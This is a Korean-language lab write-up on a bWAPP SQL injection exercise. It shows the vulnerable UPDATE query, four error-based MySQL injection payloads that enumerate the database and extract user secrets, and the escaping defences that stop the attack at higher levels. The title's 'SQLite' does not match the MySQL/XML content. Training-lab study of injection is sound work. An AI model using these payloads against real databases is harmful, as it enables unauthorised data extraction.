---
layout: single
title: (bWAPP)SQL Injection - Stored (SQLite)
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/stored-xml-archive/image.png)
- 해당 Any bugs? 버튼을 클릭해도 아무런 변화가 일어나지 않는다.

![그림 1-2](/assets/image/bwapp/injection/stored-xml-archive/image2.png)
- Burp Suite 를 통해 요청값과 응답값 패킷을 잡아 확해보면
- POST 형식의 XML 데이터를 보내는 걸 알 수 있다.
- Content-type: 부분을 보면 text/xml 인 걸 알 수 있다.

![그림 1-3](/assets/image/bwapp/injection/stored-xml-archive/image3.png)
- login 태그 내에 ‘ 싱글 쿼터를 보내면 DBMS Error을 반환한다.

```php
$sql = "UPDATE users SET secret = '" . $secret . "' WHERE login = '" . $login . "'"
```

- 해당 기능에서 사용되는 SQL 구문은 위와 같다.
- DBMS Error 가 존재하니 Error-Based 공격이 가능하다.

```sql
bee'+(SELECT 1 FROM (SELECT COUNT(*),concat((SELECT schema_name FROM information_schema.schemata LIMIT 1,1), FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)+'
```

![그림 1-4](/assets/image/bwapp/injection/stored-xml-archive/image4.png)
- 위 코드를 주입하면 Error의 내용으로 DB를 출력하고 있다.
- 이와 같은 방식으로 테이블, 컬럼, 데이터등을 추출할 수 있다.

> 해당 쿼리는 login 태그 혹은 secret태그등 둘 다 가능하다. db 질의시 문법을 잘못 주어 에러를 발생시켜 해당 에러의 내용에서 공격자가 원하는 값을 추출하는 방법이기 떄문이다.

```sql
bee'+(SELECT 1 FROM (SELECT COUNT(*),concat((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema='bWAPP' LIMIT 3,1), FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)+'
```

```sql
bee'+(SELECT 1 FROM (SELECT COUNT(*),concat((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='bWAPP' AND TABLE_NAME='users' LIMIT 0,1), FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)+'
```

```sql
bee'+(SELECT 1 FROM(SELECT COUNT(*),concat((SELECT CONCAT_WS(0x3a,secret,id) FROM bWAPP.users LIMIT 1,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)+'
```

![그림 1-5](/assets/image/bwapp/injection/stored-xml-archive/image5.png)
- 성공적으로 데이터를 추출했다.
- 하지만 이 때 해당 출력 구간에서 특정 문자열을 넘어가면 error가 발생되지 않는 문제가 생겨
- concat 를 사용하더라도 1개 혹은2개씩 데이터를 조회해야 한다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.
